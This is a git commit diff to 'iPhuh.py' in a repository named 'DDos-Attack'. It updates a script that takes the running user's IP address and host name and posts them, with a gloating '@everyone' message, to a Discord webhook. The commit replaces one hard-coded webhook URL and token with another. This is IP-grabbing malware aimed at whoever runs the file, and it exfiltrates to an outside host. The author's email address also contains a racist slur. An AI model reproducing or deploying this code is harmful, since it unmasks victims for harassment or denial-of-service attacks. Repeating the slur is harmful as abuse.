2bb5aaf5cd329000a95ad729a966ea874e86cb35
GoTHeartless <iforceblackslavestodoworknigge@gmail.com>
2024-11-11 19:45:49 +0100

    Update iPhuh.py

--- DDos-Attack/iPhuh.py
+++ DDos-Attack/iPhuh.py
@@ -6,7 +6,7 @@ print("IP Address: ", ip_address)
 
 from discord_webhook import DiscordWebhook, DiscordEmbed
 content = "# @everyone LMFAOOO WE GOT ANOTHER ONE"
-webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1249022757803393135/54UWNVgEszbTHRxvYPAxLhTXupeaTbXSMOzGRhzybci3aChUXFfrkQeMRLm98cVThJFs", username="Captain Hook", content=content)
+webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1304490243910533172/ceZNHL_lfpNCSL4MF4HbR_l7cam-Q2Sxc3hSL7iRAiA8KNL9TZ8e0ygQfnZ9KSafXQxS", username="Spidey Bot", content=content)
 embed = DiscordEmbed(title="IP: " + ip_address + " | Host: " + host_name, color = 123213)
 webhook.add_embed(embed)
 response = webhook.execute()
